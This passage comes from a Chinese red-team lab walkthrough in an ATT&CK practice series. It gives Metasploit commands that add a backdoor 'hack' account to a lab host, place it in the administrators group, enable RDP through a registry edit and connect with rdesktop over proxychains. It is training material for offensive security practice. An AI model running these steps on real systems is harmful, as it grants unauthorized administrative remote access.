![image-20231117165747432](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117165747432.png)



```bash
set rhosts 192.168.52.141        //设置IP地址为目标主机的IP地址

set COMMAND net user hack 123.com /add    //设置要添加的账号和密码，密码在设置的时候要注意：这里的密码设置有一个策略的问题存在，所以我们在设置密码的时候需要搞得复杂一点，不然过不了

exploit        //执行
```

得到以下的结果，说明执行成功

![image-20231117165716050](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117165716050.png)

继续执行，将创建的`hack`用户添加到管理员组

```bash
set command net localgroup administrators hack /add
exploit
```

![image-20231117170031190](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117170031190.png)

查看用户是否添加到管理员组里面

```bash
set command net localgroup administrators
```

![image-20231117170149311](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117170149311.png)

开启3389

因为开启3389端口命令中有两个双引号，如果整条命令外面不用单引号扩一下或者用双引号扩了，会出现一些符号闭合上的问题

```bash
set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
```

![image-20231117173256819](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117173256819.png)

#### rdesktop远程连接

安装rdesktop

```bash
sudo apt install rdesktop
```



```bash
proxychains rdesktop 192.168.52.141
```

![image-20231117173754393](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117173754393.png)

![image-20231117173835110](./ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89.assets/image-20231117173835110.png)

